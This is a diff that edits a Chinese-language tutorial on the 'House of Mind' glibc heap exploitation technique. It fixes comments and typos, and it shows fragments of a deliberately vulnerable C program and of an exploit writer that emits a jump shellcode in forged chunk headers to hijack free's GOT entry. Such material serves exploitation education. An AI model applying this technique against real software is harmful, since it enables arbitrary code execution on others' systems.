@@ -39,18 +39,18 @@ int main (void) {
  for (i = 2; i < 1024; i++) {
    /* Prereq 1: Series of malloc calls until a chunk's address - when aligned to HEAP_MAX_SIZE results in 0x08100000 */
    /* 0x08100000 is the place where fake heap_info structure is found. */
-   [1]if (!found && (((int)(ptr2 = malloc(1024)) & 0xFFF00000) == \
+    if (!found && (((int)(ptr2 = malloc(1024)) & 0xFFF00000) == \  // [1]
       (heap + 0x100000))) {
      printf("good heap allignment found on malloc() %i (%p)\n", i, ptr2);
      found = 1;
      break;
    }
  }
- [2]ptr3 = malloc(1024); /* Last chunk. Prereq 3: (Next chunk to ptr2) != av->top */
+ ptr3 = malloc(1024); /*[2] Last chunk. Prereq 3: (Next chunk to ptr2) != av->top */
  /* User Input. */
- [3]fread (ptr, 1024 * 1024, 1, stdin);
- [4]free(ptr2); /* Prereq 2: Freeing a chunk whose size and its arena pointer is controlled by the attacker. */
- [5]free(ptr3); /* Shell code execution. */
+ fread (ptr, 1024 * 1024, 1, stdin); //  [3]
+ free(ptr2); /*[4] Prereq 2: Freeing a chunk whose size and its arena pointer is controlled by the attacker. */
+ free(ptr3); /*[5] Shell code execution. */
  return(0); /* Bye */
 }
 ```
@@ -133,7 +133,7 @@ int main() {
         for(i=0;i<722;i++) {
                 if(i==721) {
                         /* Chunk 724 contains the shellcode. */
-                        fwrite("\xeb\x18\x00\x00", 4, 1, stdout); /* prev_size  - Jmp 24 bytes */
+                        fwrite("\xeb\x18\x00\x00", 4, 1, stdout); /* prev_size  - Jmp 24 bytes，eb is jmp opcode */
                         fwrite("\x0d\x04\x00\x00", 4, 1, stdout); /* size */
                         fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* fd */
                         fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* bk */
@@ -171,7 +171,7 @@ int main() {
 攻击者生成数据文件作为用户输入，当漏洞程序的第[4]行执行时，’glibc malloc’会做以下事情：  
 
 * 调用arena_for_chunk 宏获取正被释放中的chunk的arena
-	- [arena_for_chunk](https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L47) : 如果NON_MAIN_ARENA (N)位没有被设置，返回主arena(main arena)。如果已经设置，通过将chunk地址对齐多倍的HEAP_MAX_SIZE访问相应的heap_info结构体。然后，返回获取heap_info结构体的arena指针。在我们的例子中，ON_MAIN_ARENA (N)被攻击者设置，所以得到了正要被释放的chunk的heap_info结构体(位于地址0x0810000处)。heap_info的ar_ptr = Fake arena的基地址(0x0804a018)。
+	- [arena_for_chunk](https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L47) : 如果NON_MAIN_ARENA (N)位没有被设置，返回主arena(main arena)。如果已经设置，通过将chunk地址对齐多倍的HEAP_MAX_SIZE访问相应的heap_info结构体。然后，返回获取heap_info结构体的arena指针。在我们的例子中，NON_MAIN_ARENA (N)被攻击者设置，所以得到了正要被释放的chunk的heap_info结构体(位于地址0x0810000处)。heap_info的ar_ptr = Fake arena的基地址(0x0804a018)。
 * 以arena指针和chunk地址作为参数调用_int_free。在我们的例子中，arena指针指向fake arena， 因此fake arena和chunk地址作为参数传递到_int_free。
 	- Fake arena: 以下是fake arena中需要被攻击者覆盖的必要域:
 		1. [Mutex](https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L14)- 必须处于解锁状态(unlocked state).
@@ -184,8 +184,8 @@ int main() {
 	- 如果chunk没有[被映射](https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L68) (non mmap’d)，获取锁。在我们的例子中，chunk没有被映射并且fake arena的mutex lock也被成功获取。
 	- [合并](https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L87)：
 		1. 查找前一个chunk是否空闲，如果空闲，则合并。在我们的例子中，前一个chunk被分配，因此不能向后合并。
-		2. 查找下一个chunk是否空闲，如果空闲，则合并。在我们的例子中，下一个chunk被分配，因此可以向前合并。
-	- 将当前释放的chunk放入未被排序的bin中。在我们的例子中，fake arena的未排序bin的fd含有free函数的GOT表项地址（12），被拷贝到‘[fwd](https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L100)’中。之后，[当前被释放的chunk的地址被拷贝到’fwd->bk’中](https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L109)。 bk位于malloc_chunk的12偏移处，因此12加入到’fwd’值中(ie. free- 12+12)。现在free的GOT表项被当前释放的chunk地址修改。由于攻击者已经将shellcode放入到当前被释放的chunk中，从现在开始，只要free被调用，攻击者的shellcode就会执行。  
+		2. 查找下一个chunk是否空闲，如果空闲，则合并。在我们的例子中，下一个chunk被分配，因此不能向前合并。
+	- 将当前释放的chunk放入未被排序的bin中。在我们的例子中，fake arena的未排序bin的fd含有`free函数的GOT表项地址 - 12`，被拷贝到‘[fwd](https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L100)’中。之后，[当前被释放的chunk的地址被拷贝到’fwd->bk’中](https://github.com/sploitfun/lsploits/blob/master/hof/hom/malloc_snip.c#L109)。 bk位于malloc_chunk的12偏移处，因此12加入到’fwd’值中(ie. free- 12+12)，现在free的GOT表项被当前释放的chunk地址修改。由于攻击者已经将shellcode放入到当前被释放的chunk中，从现在开始，只要free被调用，攻击者的shellcode就会执行。  
 
 把攻击者的数据文件当做用户输入，执行上述漏洞代码，就会执行攻击者的shellcode，如下所示  
 
